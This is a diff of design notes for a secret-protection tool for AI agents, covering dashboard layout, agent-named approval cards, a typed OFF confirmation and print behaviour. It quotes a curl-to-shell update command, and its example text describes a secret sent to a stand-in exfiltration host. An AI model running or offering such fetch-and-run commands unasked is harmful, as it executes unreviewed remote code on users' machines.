+  waiting, 283 px with up to 9 not saved, of a 320 px phone's 288. Only a
+  320 to 325 px phone with two digits in both runs 2 px past and scrolls;
+- **540 to 829 px** (520 to 799 before), one row: 488 px with 99 waiting
+  and 99 not saved, of the 497 px row at 540;
+- **from 830 px** (800 before) the bar, 7 px a side until 970 px (940
+  before), 14 px from there: with 99 and 99 beside "Protection unknown",
+  5.8 px to spare at 830 and 6.2 at 970.
+
+A headless Chromium over the stylesheet, with 99 waiting, 9 or 99 not
+saved and "Protection unknown", at 320, 326, 375, 539, 540, 829, 830, 969,
+970 and 1280 px: no sideways scroll of the page, no status cut, the row
+2 px past only at 320 px with 99 and 99, and the Rules link as the model
+says (58 → 79 and 86 px at 540, 52 → 73 at 830). Tests:
+`css-nav-fits.test.ts` (F1 to F7 at the new ranges; F8 both marks at every
+window from 320 to 1280 px and every status; F9 the ring in its link, no
+fill, as tall as the count, its digits at AA on the bar, a hovered link and
+the current page, light and dark), and the stack tests above at the new
+ranges (`nav-fits-count` at 539 and 829 px, the two top-status tests from
+830 px).
+
+*The bar stays in sight on a wide window (2026-10-26).* The bar holds the
+page's two live signals: the Approvals count (a new question waiting) and
+the protection status (*The top bar says on or off*). Until 2026-10-26 it
+scrolled away with the page. A 1280 px render of a recorded session page
+was 4,499 px tall, so after its first screen a question from another agent
+showed only in the tab's title and icon, and a browser that blocks
+notifications showed nothing else on the page. The developer view's bar
+was already fixed, with the room kept for it (*The top bar never hides the
+focus*, below). Now, from 830 px, where the bar is one 64 px row (the
+ranges above), it is `position: sticky; top: 0` with z-index 10. That puts
+it above the cards and the Rules page's bar of changes to save (5, §4.25n),
+and under the help notes (20), which still draw over it. Its ground,
+`--panel-2`, is opaque in both themes, so the page scrolls under it
+cleanly. The window keeps the bar's 65 px and 8 px more above whatever it
+scrolls into view (`html { scroll-padding-top: 73px }`, the same width
+query). This covers the section links under each title, a tile's jump,
+Latest turn, a link that opens at its card, a focused control on Tab (WCAG
+2.4.11, *Focus Not Obscured*), and a `/approvals/<id>` or `/rules?file=`
+landing. Back's restored place is a recorded scroll offset, or a turn's
+recorded height on the screen, so it comes back where it was. Two checks in
+home.js asked whether a box was in view by comparing its top with the
+window's edge, which is under the bar: a reply folded again from its button
+(which scrolls the button back into view) and Back to History (which brings
+the opened row into view). Both now compare with `barRoom()`, the window's
+`scroll-padding-top`. Under 830 px the bar is two
+or three rows (about 128 px on a 390 px phone), and it still scrolls away,
+so it never takes a phone's screen. Print still hides it. There the window
+keeps 8 px above what it scrolls into view (`html { scroll-padding-top:
+8px }`, before the width query, so a wide window's 73 px replaces it;
+2026-10-31). Until then it kept none, and a link to a turn landed the turn
+flush with the screen's top: in headless Chromium at 390×900 at -0.2 px,
+which cut off the top of a marked turn's accent ring (`.turn.shown`, a 1 px
+ring outside its border) and the curve of its corners. With the 8 px it
+lands at 7.8 px and the ring is whole (1280 px: 73.3 px, unchanged). The
+same room serves Latest turn, the section links, a link that opens at its
+card and What happened's heading, and `barRoom()` is then 8 on a phone, so
+its two checks treat the screen's top 8 px as out of view. Tests:
+`css-top-bar-sticks.test.ts` (sticky, the z-index between the two overlays,
+and the room of at least the bar's height from 830 to 1920 px; not sticky
+and an 8 px room at 320, 390, 540, 799 and 829 px; the row 64 px from 830 px; the opaque
+ground in light and dark; print; home.js's two checks), and the stack test
+`top-bar-sticks.test.ts`. That test runs a real arbiter, proxy and
+dashboard, with a six-turn session and a send waiting, in a real Chromium.
+At 1280×900, scrolled to the end, the bar is at the window's top and the
+Approvals link, its count and the status are drawn on top. Latest turn
+lands the turn 73 px down. The waiting tile, a reply folded again under the
+bar, and Rules' *Built-in protections* section link each land below the
+bar. At 390×844 the bar has scrolled away. No value or token appears.
 
 **The tiles fill their rows evenly (2026-10-15; app.css).** A session's
 page opens with one tile per count (`#agent-facts`, home.js
@@ -9702,9 +12765,14 @@ carry it). The product page uses it twice:
   doing"** in its footer, in a question card's place (left, the answers
   right), and opens the agent page of that session at its top
   (`askLink(session, null)`, as the origin line does). A request with no
-  session has no link. A wide change's card keeps its "Type ALLOW" field
-  after the link. The link, the answers and that field are named by the
-  request (*The answers on a request card name their request*).
+  session has no link. A wide change's card says why it asks for ALLOW
+  on a line of its own, right above the footer, and its "Type ALLOW" field
+  stands with the answers on the right, beside the Allow it turns on: the
+  link left, then the field, Allow and Not now (also the Tab order); with
+  no link, the field and the answers still sit right, and on a phone the
+  row wraps from the left (*A wide change says what is open*, 2026-10-31).
+  The link, the answers and that field are named by the request (*The
+  answers on a request card name their request*).
 - **The card names who asked (2026-10-20).** With two agents running,
   say Claude Code in `~/shop` and Codex in `~/blog`, the card of a
   request to let every program connect anywhere read "Your agent wants to
@@ -9724,9 +12792,57 @@ carry it). The product page uses it twice:
   folder follows a moment only. The draw key (`sameAsDrawn('proposals',
   …)`) holds each card's agent and folder, so a poll that brings the row
   draws the card again, keeping a typed ALLOW and its focus. Home's line
-  and the heading "Rule changes your agent asked for" are unchanged. No
+  and the heading "Rule changes your agent asked for" were unchanged
+  (until 2026-10-28, *Home and the heading name the agent* below). No
   new data is served: the name and folder are Home's rows, the session id
   was on the card.
+- **A rule change, once made, names its agent too (2026-10-23).** With
+  Claude Code in `~/shop` and Codex in `~/blog` both running, Approvals ›
+  *Rule changes* read "Your agent tightened your rules" for either, and the
+  line under the rule on Rules "Your agent added this. It only makes your
+  rules stricter, so it did not need your OK". Now `toChangeRow` and
+  `ruleOrigins` add, for the two kinds an agent did (`changeWho` `agent`
+  and `agent-approved`), `who` and `named`: the sentence's words around
+  "your agent" (`{ before: "You approved a change ", after: " asked for" }`),
+  from which the server builds its own sentence as before. The page finds
+  the session among Home's rows (`sessionAsker`, which `proposalAsker` now
+  calls) and draws `before + agent + after`: **"Claude Code tightened your
+  rules"**, **"You approved a change Codex asked for"**, **"Claude Code
+  added this. It only makes your rules stricter, so it did not need your
+  OK"**, **"Claude Code asked for this and you approved it"**. The folder
+  follows the moment as on the request's card (`askedFrom`): "Oct 21, 16:31
+  · 2 min ago · from Claude Code in `~/shop`. See what the agent was
+  doing", on the origin line before its links. It never matches the
+  English: a row without `who` (anyone else, an Undo, a scan suggestion, a
+  policy.yaml edit, an older server) keeps the server's words, as does a
+  session Home does not list or an agent of no known kind. The row's name,
+  and so Undo's and the link's (`changeWords` when the row lists nothing),
+  follow the drawn sentence. Rule changes' draw key holds each row's agent,
+  so the Home poll that brings the session names it; Rules is not drawn
+  again by that poll, so it draws again only the origin lines whose agent
+  changed (`renameOriginLines`), a focus on one of their links kept.
+- **Home and the heading name the agent (2026-10-28).** With Claude Code
+  in `~/shop` and Codex in `~/blog` both running, the cards named the
+  agent that asked, but Home's line still read "1 rule change your agent
+  asked for is in Approvals" and Approvals' heading "Rule changes your
+  agent asked for", so learning which agent wanted a rule loosened took a
+  click and a read of the card. Now, when every waiting change is your
+  agent's (`askedByAgent`), all from one session (`session`), and Home
+  knows that session's agent (`proposalAsker`; `proposalsAsker` checks
+  the three), Home reads **"1 rule change Claude Code in `~/shop` asked
+  for is in Approvals"** ("2 rule changes … are"), the folder as code as
+  in `askedFrom`, or "… Claude Code asked for …" with no folder known; the
+  heading reads **"Rule changes Claude Code asked for"**: the agent only,
+  each card keeps its folder. Changes from two or more sessions, a session
+  Home does not list, an agent of no known kind ("The agent") and a card
+  without `byAgent` keep "your agent"; any change not from your agent
+  keeps "… wait for you" and "Rule changes waiting for you". With nothing
+  left but an answer's line, the heading is named by the change answered,
+  the same way. Both draw keys (`sameAsDrawn('home-waiting', …)`,
+  `sameAsDrawn('proposals', …)`) hold the named agent, so a Home poll that
+  brings the session's row names it. The agent page's own line ("this
+  agent") is unchanged. Presentation only, as the cards: the names are
+  Home's rows of the same poll.
 
 An agent could name another session's key when it asks; the link would then
 open that session's page, which shows only that session's own record, as
@@ -9758,6 +12874,32 @@ session's `~/blog`); `home-js-proposal-asker.test.ts` (jsdom) pins the
 agent and folder, a session Home does not model, a row with no folder or
 an agent of no known kind, your own request and a held disk change, and a
 poll that brings the row with a typed ALLOW and its focus kept.
+Since 2026-10-23 (*A rule change, once made, names its agent too*),
+`policy-proposals-view-model.test.ts` pins `who` and `named` for the two
+kinds (each origin form) and none for anyone else;
+`home-js-change-history-agent.test.ts` (jsdom) the named row, its folder,
+a second agent, a session Home does not list, Undo and the row's names, and
+a poll that brings the session; `home-js-rule-origin-agent.test.ts` (jsdom)
+the origin line, both links, the line without `who`, and Home answering
+after Rules drew, the focus kept. `tests/stack/change-history-agent-link.test.ts`
+(`secrets`) gives each session a folder in its system prompt: both rows and
+the Rules lines under A's key file and `.env` name Claude Code and the
+folder, and the oracle finds `.env`'s value nowhere.
+Since 2026-10-28 (*Home and the heading name the agent*),
+`home-js-proposal-asker.test.ts` (jsdom) pins Home's line and the heading
+for one session with its agent and folder (the folder as code, one and
+two changes), one with no folder, two sessions, a session Home does not
+list, an agent of no known kind, a change not from your agent among them,
+the heading after the last change is answered, and a poll that brings the
+row; `tests/stack/own-rule-change-waiting.test.ts` (`secrets`) O6 runs the
+agent's session through the real anthropic-proxy with its folder in the
+system prompt, and Home's line and the heading must name Claude Code. Both
+fail on the old page. `agent-page-rule-change.test.ts`,
+`product-link-width.test.ts` and `home-js-proposals.test.ts` name one
+session, so their pinned words now name its agent; the link-width test
+counts a link's lines rather than its boxes (a folder is a `code` box of
+its own), and lets a link wrap only where its words on one line are wider
+than its column, never at 1280 px.
 
 **The history row links the agent too (2026-10-12).** Once the change is
 made, Approvals' *Rule changes* lists it ("Your agent tightened your
@@ -9835,7 +12977,9 @@ a request that is not the agent's:
   "Your agent says", still last and as text;
 - the block's heading reads **"Rule changes waiting for you"** while any
   waiting change is not the agent's (`home.js askedByAgent`), and "Rule
-  changes your agent asked for" when every one is;
+  changes your agent asked for" when every one is; either is followed by
+  the count of the cards waiting, "(2)", muted (§4.25 *Rule changes count
+  their cards*, 2026-11-04);
 - Home's line reads **"1 rule change waits for you in Approvals"** ("2 rule
   changes wait …") in the same case, as it already did for a held change;
 - an Allow answered `refiled` says "The rules changed since this was asked;
@@ -9921,6 +13065,28 @@ what it opens, Allow stays off until ALLOW is typed, Allow records
 the approval and Not now the denial, and no page or answer carries the
 locked file's value or a token.
 
+**Where the line is drawn (2026-10-31).** The line sat in the foot,
+between the link and the field. Measured at 1280 px (a seeded headless
+Chromium, the connect to any address), it ran on from "See what the
+agent was doing" on the same line, 8 px after it in the same size, so the
+one sentence that says why you type ALLOW read as the link's tail; and the
+field, Allow and Not now wrapped to the next line at the left, the one card
+whose answers did not sit right, on the card that opens the most. Now
+`proposalCard` draws the line (`wideWhy(…, own)`, a `div`) on its own,
+right above the foot (10 px, half the card's gap), so it is read, and
+heard by a screen reader, before the link and the field; the foot is every
+card's, the link left (`margin-right:auto`) and the field with Allow and
+Not now right (`.proposal-foot`: with no link the field takes the left
+margin; under 641 px the row wraps from the left as before). The words,
+their ink, the field, what Allow, Not now and Enter do, every name and the
+Tab order (link, field, Allow, Not now) are unchanged; Describe's
+suggestion keeps the line in its foot. Tests: `home-js-proposals.test.ts`
+(the line before the foot and not in it, the foot's order, no link, a card
+that is not wide); stack `wide-change-why.test.ts` W7 (the served page's
+order) and W8 (headless Chromium at 1280 px: the line on its own line
+above the link's, the answers at the card's right; skips with no
+Chromium).
+
 **The typed ALLOW takes any case, and Enter (2026-10-19).** The box of a
 wide change took only the exact text `ALLOW`, with nothing on the card
 saying when what you typed did not count. A phone keyboard capitalises
@@ -9970,6 +13136,67 @@ Enter in the box approves the agent's connect to any address, which the
 arbiter records as approved. `wide-change-why.test.ts` W3 now types "ALLO"
 for the word not yet typed. The confidentiality oracle is unchanged:
 nothing here touches a secret or what is sent.
+
+**Turning protection off asks on the page, and OFF takes any case
+(2026-10-25).** Turning protection off in Settings › Protection asked with
+the browser's own `window.prompt` and took only the exact text `OFF`.
+"off", "Off" (a phone keyboard capitalises the first letter) and "OFF "
+(autocomplete's space) returned silently: the switch stayed On, nothing
+said why, and the person pressed again or thought the switch broken. A
+browser that blocks dialogs returned `null` at once, read as a wrong word.
+The prompt did not follow the dark theme, and gave no hint and no Enter.
+The typed ALLOW above had the same fault and was fixed on its own, so the
+product's two typed confirmations behaved differently.
+
+Now a press of the switch while protection is on opens a box in the
+Protection row (`#settings-protect-confirm`, home.js `askOff`, under the
+row's columns, a group named by its sentence):
+
+- "Turning this off lets your secrets leave this computer. Type OFF to
+  turn it off.", a text box, **Turn off** (off until the word counts) and
+  **Cancel**. Opening it puts the focus in the box; a second press of the
+  switch puts it back there;
+- the word counts in any case, with the spaces around it trimmed
+  (`typedWord(value, 'OFF')`; `typedAllow` is `typedWord(v, 'ALLOW')`):
+  "OFF", "Off", "off" and " off " count; "OF", "OFFF" and an empty box do
+  not. The person still types the word, which is what the gate is for.
+  While the box holds a word that does not count, a line under it says
+  "Type the word OFF to turn protection off." and describes the box. The
+  box is drawn by `confirmBox`, which now takes the word to ask for (its
+  placeholder and hint say it), so it asks a phone for capitals and no
+  corrections as the ALLOW box does;
+- Enter in the box presses Turn off when it is on. Escape or Cancel close
+  the box and give the switch the focus back; the switch stays On;
+- the box is 16 px at every width (app.css `.protect-confirm`), so iOS
+  does not zoom the page;
+- Turn off posts exactly what the switch posted (`POST /api/config/axes
+  {mode}`, the same mode, home.js `sendProtection`), under the hold above;
+  a refusal shows in `#settings-protect-note` as before. The answer closes
+  the box;
+- a redraw (Home's poll, a read of the setting) leaves the box and what was
+  typed in it; a read that finds protection saved off (a terminal turned it
+  off) or unreadable closes it;
+- turning protection back on still needs no typed word.
+
+Presentation only: the endpoint, its auth and CSRF gate, the mode sent, the
+frozen axis and the gate itself (a typed word before protection goes off)
+are unchanged. Turning protection off is still a human-only act on this
+page. Tests: `home-js-settings.test.ts` (the box opens and posts nothing;
+any case and trim; OF, OFFF and the hint; the keyboard attributes; Enter
+posts once; Cancel and Escape; a redraw keeps the box; saved off elsewhere
+closes it; `window.prompt` is never called), and the tests that stubbed
+`window.prompt` for this switch now type in the box
+(`home-js-click-no-answer`, `home-js-reads-order`, stack
+`protection-switch-holds`, `protection-switch-order`,
+`product-click-no-answer`; helper `dashboard/test/unit/ui/protect-off.ts`).
+Stack `tests/stack/protection-off-typed.test.ts` (`secrets`, a real
+arbiter with a labelled file, the production adapter, a real dashboard
+with its config.toml in a scratch `MANDU_HOME`, signed in), in jsdom over
+the served page and in headless Chromium at 390 px: "of" keeps Turn off
+off with the hint and leaves config.toml unchanged, Escape gives the switch
+the focus; "off" and Enter write `mode = "off"` and the row reads Off; at
+390 px and 1280 px the box and its buttons fit the row with no sideways
+scroll and a 16 px box; no page carries the labelled value or a token.
 
 **Shipping.** The npm bundle copies both directories beside the bundled
 server (`dist/dashboard/public`, `dist/dashboard/dev`; the manifest's
@@ -10038,7 +13265,7 @@ exchange, which a flat one-line-per-call story missed.
   that history; to stop it, remove that folder outside Mandu), "Mandu
   blocked deleting or renaming a protected file: `name`" (`protect:`),
   "Mandu blocked a change to a protected file: `name`" (write-protect), and
-  "A program got the placeholder copy of `name`, not the real file" (a
+  "A program got the masked copy of `name`, not the real file" (a
   network or FUSE mount could see the read). No host-shaped *Why*.
   A refused Unix socket is worded the same way (2026-10-11): the walk with
   Claude Code started inside tmux met it when the agent ran `tmux` and the
@@ -10153,15 +13380,15 @@ exchange, which a flat one-line-per-call story missed.
   token on the page).
 - **Sends that carried a secret** (§4.2f, the `carried` items): "Sent a
   request to `api.github.com` with your secret `GITHUB_TOKEN` filled in"
-  (outcome `sent`, tag *Sent out*, note "The real value left this machine, to
+  (outcome `sent`, tag *Sent out*, note "The real value left this computer, to
   a destination allowed to receive it."), "Mandu blocked a request to
   `collector.evil.example` that carried your secret `GITHUB_TOKEN`" ("The
-  request never left this machine."), "Wants to send … to …" while waiting.
+  request never left this computer."), "Wants to send … to …" while waiting.
   An item is named by its variable or key (`secret-story.ts`
   `secretShortName`: the twin's field, else its origin's base name), "a secret
   of yours" when neither is known, "a masked item" when it is not a secret;
   never the token. `sent` ranks just above `plain` (a send never softens a
-  turn's tone), and the summary adds "N requests left this machine with your
+  turn's tone), and the summary adds "N requests left this computer with your
   secret `A` filled in, each to a destination allowed to receive it." ("1
   request … filled in, to a destination …" for one; see
   *The summary names the secrets* below).
@@ -10204,7 +13431,7 @@ exchange, which a flat one-line-per-call story missed.
   step says so; with `issuer_bindings: false` the send asks and no step
   says so; no answer carries the token).
 - **A block says why** (2026-10-05). A blocked step read "Mandu stopped
-  it." or "The request never left this machine." and never why. In the
+  it." or "The request never left this computer." and never why. In the
   tour, the 10:38 block of `STRIPE_KEY` to `api.stripe.com` sat one turn
   above a send of the same key there, with nothing to tell them apart. Yet
   every gate event records the rule that decided it (`policy.ruleRef`, the
@@ -10286,8 +13513,8 @@ exchange, which a flat one-line-per-call story missed.
     both, and hands `buildAgentPage` each answered row's outcome by id
     (`answers`, home.ts `answeredOutcome`, the function *Answered earlier*
     uses). A story step whose `askId` is answered carries `answer`, and the
-    line ends "Your answer: Blocked." (or "Always allowed", "Allowed once,
-    unused", "Allowed once"): the words of the row the link opens
+    line ends "Your answer: Blocked." (or "Always allowed", "Allowed for
+    this session", "Allowed once, unused", "Allowed once"): the words of the row the link opens
     (home.js `answerLabel`, shared by both). It is the row's answer now, so
     a reversal ("Allow instead") changes it, and a row two sessions share
     says the same in both. A waiting row, an unreachable arbiter, an
@@ -10298,6 +13525,26 @@ exchange, which a flat one-line-per-call story missed.
     your OK in Approvals") still says only that Mandu asked. The
     inspector's line says the answer too, in the words of its own Answered
     earlier ("Your answer: Block.", §4.2f *The answer*, 2026-10-09).
+  - **Kept in Rules** (2026-10-23, nightly #101). *Always allowed* and
+    *Blocked* are standing answers, and only Rules forgets one (*Remove*),
+    yet the step named the answer and led only to Approvals, whose row then
+    led to Rules. A step whose `answer` is `allowed` or `blocked` (or,
+    since 2026-10-28, `allowed-session`, §4.25 *The allow that reverses a
+    Block names its scope*) now ends
+    its line with **Kept in Rules**: "Mandu asked for your OK in Approvals.
+    Your answer: Always allowed. Kept in Rules". It is Answered earlier's
+    link (`home.js keptLink`, §4.25 *A remembered answer opens where Rules
+    keeps it*): `/rules#answer-<askId>`, a plain click opens Rules with the
+    row open and the focus on its ⋯, a modifier click is the browser's, and
+    an answer forgotten meanwhile lands on the no-longer-kept note. *Allowed
+    once*, *Send without it*, a held message's answers and a waiting step
+    get no link. No new data: the step already carries `askId` and
+    `answer`. Tests: `home-js-answered-in-rules.test.ts` (which steps link,
+    the click, the modifier click, the note) and
+    `tests/stack/session-step-kept-in-rules.test.ts` (a real Always allow
+    from the net-proxy on its production client, the served session page's
+    link opens the row, Remove there makes the same send wait again; the
+    no-value, no-token oracle).
   - **Which check.** An OS step uses its own event's id. A tool step uses
     the one on the gate that decided it (`decidingGate`, the gate the why
     reads). A check that let the call through, a flagged step, a
@@ -10321,7 +13568,7 @@ exchange, which a flat one-line-per-call story missed.
   through a real arbiter: its event names the pending row, and the real
   dashboard's step carries that row's id) and
   `tests/stack/answered-ask-link.test.ts` (Block over the real route: the
-  served page's marked step says "Your answer: Blocked."; Allow instead:
+  served page's marked step says "Your answer: Blocked. Kept in Rules"; Allow instead:
   the route's step says `allowed`, as `/api/home` does).
 - **A call Mandu rewrote reads as what it stopped** (2026-10-07, nightly
   run 1430). The model proxies enforce an exec or net block by rewriting
@@ -10525,6 +13772,15 @@ exchange, which a flat one-line-per-call story missed.
   split into *What the AI saw* (a `masked` or `secret` chip, never the token)
   and *What really happened*. Under 760px the halves stack and label
   themselves.
+- **On a phone a step with no tag has no second row** (2026-10-29). At
+  760 px and under a step's grid (`.step.wide`, `.half-body`) has two
+  columns and its tag takes a row under the words. A reply, an ordinary,
+  "said" or condensed step ends in an empty tag slot, which wrapped onto a
+  row of its own and added the 12 px gap: on the tour at 390 px each had
+  12 px more under its words than above them. Under that width an empty
+  trailing span is `display: none`; a tag keeps its row, and wider windows
+  keep the slot's third column (unit `css-empty-slots.test.ts`; stack
+  `empty-slots-gap.test.ts`, headless Chromium at 390 and 1280 px).
 - **A reply that held only secrets is one card** (2026-10-05). A reply
   split whenever its text held a placeholder. But the page never fills in a
   secret, signed in or out (`revealParts`), so the tour's 10:36 and 10:42
@@ -10568,6 +13824,23 @@ exchange, which a flat one-line-per-call story missed.
   It used to say only "A secret.", so the read could not be matched to the
   card above that names the same key. Names only: the value guard below is
   unchanged. Tests: `agent-page.test.ts`, `session-walkthrough.test.ts`.
+- **A masked result's chip names its secret** (2026-10-27). The AI half's
+  chip said `secret` while the right half, the reveal button and the send
+  steps named the same secret: on the OpenClaw plugin's session page the
+  debug run read "Got the result with ⟨secret⟩ in place of the real value."
+  beside "The result held your secret `ORDERHUB_PASSPHRASE`.", and the
+  promo video's figure, which names its mask, could not match the page.
+  Now, when a masked result held exactly one secret with a name (several
+  tokens of one named secret count once, as the right half counts them),
+  its chip carries that name (`StoryPart.name`, drawn as a command's
+  chip is, titled "Your secret ORDERHUB_PASSPHRASE, masked: the AI never
+  got the real value"): "Got the result with ⟨ORDERHUB_PASSPHRASE⟩ in place
+  of the real value.", "Got ⟨.env⟩ in place of the result.". A result
+  holding several secrets, or one with no name, keeps the `secret` chip. A
+  name only, as `secretShortName` gives it (a twin's field, the
+  variable, a file's base name, never a piece of a command): never a token
+  or value. Tests: `agent-page.test.ts`, `plugin-session-page.test.ts` (a
+  plugin session's read and debug run, served).
 - **A command's output is never named by a piece of the command**
   (2026-10-07, nightly run 1030; the work ledger's tour item 7). The
   proxies record a masked result's origin as its call's locator
@@ -10747,6 +14020,12 @@ exchange, which a flat one-line-per-call story missed.
   - The `note:` form (a listed reader's output released by its rule) still
     reads as masked, as any form this rule does not read; wording that
     release is open.
+  - The `copy:` line (2026-10-27, plan 10 §4.1 "The model is told at the
+    call": the call wrote a protected file, whose change stays in its
+    placeholder copy) masks nothing and refuses no read: `noteMasks`
+    passes over it, so Edit's refused save of a `.env` with that line alone
+    is not "Secret hidden", and beside a `masked:` line the step stays
+    masked.
   - **The inspector counts them too** (2026-10-07, nightly run 0830). Its
     counts read only gates and verdicts, so over the same session it said
     "1 step blocked" where the page said 3, and drew both commands as
@@ -10788,7 +14067,7 @@ exchange, which a flat one-line-per-call story missed.
   carried or was blocked with) and the steps' label. It returns
   `summaryParts`, names drawn as code (`summary` keeps the plain text): "Mandu
   blocked 1 request that carried your secret `GITHUB_TOKEN` and hid your
-  secret `PASTE_KEY` from the AI. 2 requests left this machine with your
+  secret `PASTE_KEY` from the AI. 2 requests left this computer with your
   secrets `GITHUB_TOKEN` and `PASTE_KEY` filled in, each to a destination
   allowed to receive it." One request reads "…filled in, to a destination
   allowed to receive it.", never "each" (2026-10-06).
@@ -11106,6 +14385,93 @@ exchange, which a flat one-line-per-call story missed.
   `tests/stack/reply-fold.test.ts` (the real stack in `secrets`, a real
   Chromium at 1280 and 390 px, and the oracle: no key and no admin token in
   any read, signed out or in).
+- **A printed session is whole** (2026-10-23, nightly run 1230). A
+  session page is the record of what the AI saw and what really
+  happened, and a person who reports a leak or keeps an audit trail
+  prints it or saves it as a PDF. The print was the screen as it was:
+  each run of steps past a turn's first 6 was left out, a long reply
+  printed its first 10 lines under the fade, a question past 360
+  characters printed its first 360 and "…", and the top bar, the back
+  link, the switch and every "Show…" and answer button printed too,
+  though none of them works on paper. Now:
+  - **Opened for the print, put back after.** The browser fires
+    `beforeprint` before it prints (Ctrl+P, Save as PDF, its print
+    preview) and `afterprint` after. home.js `printOpen` opens, in the
+    story, every folded run of steps and every clipped question or shell
+    output through its own button (its words and `aria-expanded`
+    follow), every long reply through its fold's own toggle (a press
+    that folds scrolls the button into view, which would move the screen
+    after the print), every closed file list of a setup step, and *What
+    the counts mean* under the tiles (2026-10-30, §4.25).
+    `printClose` folds back only what `printOpen` opened, so a run you
+    had opened stays open and the screen is as before. While it prints,
+    a poll does not draw the page again (`renderAgentPage`): a read that
+    came meanwhile is asked again after, so a redraw cannot undo the
+    opening under the print preview.
+  - **The switch holds.** With *Only where Mandu stepped in* on, a folded
+    quiet turn is not opened, nor anything in it: the print has the turns
+    the screen chose, and each folded run's line ("5 turns where Mandu
+    did nothing").
+  - **On paper, only the record.** app.css's `@media print` drops the top
+    bar, the *Viewing as public* banner (both on every page's print), the
+    back link, the detailed-trace link, the switch, *Latest turn*, help
+    buttons, every control button of the session page and the Newer and
+    Older links to other sessions (since 2026-11-04, #293: they did
+    nothing on paper and put other sessions' questions into a record
+    people hand on); a count tile and a step's time are content and stay. A folded reply prints whole
+    there too, so a browser that fires no `beforeprint` still drops the
+    controls and the fade, and only its folded steps and clipped
+    questions stay folded. Links print as their words. A step, a turn's
+    head and summary, a card and a tile are not split across pages where
+    they fit (`break-inside: avoid`). At a page's width (under 760 px)
+    a split step stacks, each half under its own head, "What the AI saw"
+    and "What really happened", kept with what follows it.
+  - **A value hidden on screen stays hidden on paper.** The print asks
+    the server for nothing: no *Show the real value*, no *Show what was
+    hidden* (outside content Mandu kept from the AI), no "Show them" past
+    the page's caps (their line, "3 more steps are not shown here.",
+    prints as it is). A secret prints as its masked chip, and a value
+    you chose to show prints as shown.
+  - **On paper, the light palette** (2026-10-26, nightly run 0330). The
+    print kept the theme on screen. From the dark theme (Settings ›
+    Appearance *Dark*, or *Same as this computer* on a dark computer) a
+    session printed by headless Chromium with "Background graphics" off
+    had its heading and body text `#989794` on white (about 2.9:1, under
+    AA's 4.5:1), the dim time line `#4e4e4a`, darker than the heading,
+    and a masked chip and a `masked` tag as dark filled bars (their
+    `print-color-adjust: exact`); with "Background graphics" on, the
+    page was black. Now mandu.css's palette ends with an `@media print`
+    block on `:root:root:root` that sets `color-scheme: light` and the
+    light `:root` value of every palette variable. Its specificity
+    (0,3,0) outranks both dark rules (`:root:not([data-theme="light"])`
+    and `:root[data-theme="dark"]`, (0,2,0)), so any page printed or
+    saved as PDF is dark on white with light chips, the same colours a
+    light-theme print has; the chips keep `print-color-adjust: exact`.
+    The screen and the stored theme do not change. The block repeats the
+    light values; `css-print-palette.test.ts` keeps the two equal, so a
+    new palette variable goes in both. The developer view loads the same
+    mandu.css, so it prints light too.
+
+  Tests: `home-js-agent-print.test.ts` (jsdom, the events fired as the
+  browser fires them: a 12-step turn, a 4,000-character reply and a
+  900-character question open and fold back with their words and
+  `aria-expanded`; a run you opened stays open; the switch's folded turns
+  stay folded; no redraw while printing, one after; no reveal asked; the
+  stylesheet's print rules), `tests/stack/agent-page-print.test.ts` (the
+  real stack in `secrets`, a real Chromium: the print media shows no
+  control; `Page.printToPDF`, which fires both events, gives a PDF whose
+  text holds the 7th step, the question's end and the reply's last line
+  and no "Show" words; with a newer session recorded, the Newer link
+  shows on screen, not under the print media, and the PDF holds neither
+  "Newer:" nor that session's question; the screen after is as before; the oracle: the
+  PDF holds the secret's masked chip and never its value, signed in with
+  values hidden and signed out, and no read carries the key; with Dark
+  stored, and with *Same as this computer* on an emulated dark system,
+  the print media gives the heading, the line under it, the question and
+  the masked chip the light print's computed colours, and the screen
+  keeps its dark ones), `css-print-palette.test.ts` (the print block is
+  the light palette, value for value, with `color-scheme: light`; its
+  selector outranks both dark rules; it comes after them).
 - **A code block has a Copy button** (2026-10-22, nightly run 0330).
   Agents often end a reply with a command for the person to run, and a
   fenced block (`pre.code-block`) keeps its lines as written and scrolls
@@ -11151,6 +14517,125 @@ exchange, which a flat one-line-per-call story missed.
   scrolls; the oracle: no button for the masked block, in Your secrets or
   beside a revealed box, and no Copy on the page puts the key on the
   clipboard).
+- **A command Mandu asks you to run has one too** (2026-10-26, nightly run
+  2026-10-26-0030, queue #118). Until then every command the page itself
+  asked for was a bare `<code>` (`ownCode`), selected by hand. The longest
+  is the one that matters most: the security update's
+  `curl -fsSL https://github.com/<repo>/releases/download/v<version>/install.sh | sh`
+  (about 90 characters; a drag that misses the first `c` or the last `sh`
+  runs a broken or partial command). Now one helper, `runCode(text, name)`,
+  draws the code and a small **Copy** after it in a `span.run-code`. The Copy
+  is the reply's (`copyButton`, given the text instead of a node): Copied or
+  Could not copy for two seconds, the polite status, the focus kept, and no
+  button where the browser has no clipboard. It is small and inline
+  (`.run-copy`, 20 px high), and the pair wraps to the next line as one, so
+  a one-line note on a phone keeps its words. Print hides it, as it hides
+  the reply's Copy. The places, each named for what it copies:
+
+  | Where | The command | The button's name |
+  |---|---|---|
+  | Home's security notice (`renderUpdateNotice`), Settings › About Mandu's Version row (`aboutUpdateNode`) | the update line, `installLine` (`curl … \| sh` or `npm install -g …`) | "Copy the update command" |
+  | Home's first-run card, each step's commands (`renderFirstRun`) | `mandu claude`, `mandu doctor --secrets`, … | "Copy mandu claude", … |
+  | Home's scan card and the Scan page, the again line (`againParts`) | `mandu scan` | "Copy mandu scan" |
+  | A session that could not do its job: its page's notice and the warning mark's note (`noticeParts`) | `mandu log <session>` | "Copy mandu log <session>" |
+  | Home's account-changed card, Settings › Dashboard account (index.html `code[data-run]`, `wireRunCodes` at boot) | `mandu dashboard --set-password` | "Copy mandu dashboard --set-password" |
+  | Plugins, a host's set-up steps (`pluginHost`; #147) | `mandu serve install`, `mandu openclaw install`, `openclaw gateway restart` | "Copy mandu openclaw install", … |
+  | Plugins, the service line while stopped with a card (plugins.ts `serviceVM`; #147) | `mandu serve start`, `mandu serve install` | "Copy mandu serve start", … |
+  | Plugins, a card's cost notice, and Home's exposure card (`PLUGIN_EXPOSURE_FIX`; #147) | `mandu openclaw gateway`, `mandu serve stop`, `mandu openclaw uninstall` | "Copy mandu serve stop", … |
+  | Plugins, a route-lost card, and Home's lost-route card (`ROUTE_FIX_PARTS`; #147) | `mandu openclaw install`, `openclaw gateway restart`, `mandu openclaw uninstall` | "Copy openclaw gateway restart", … |
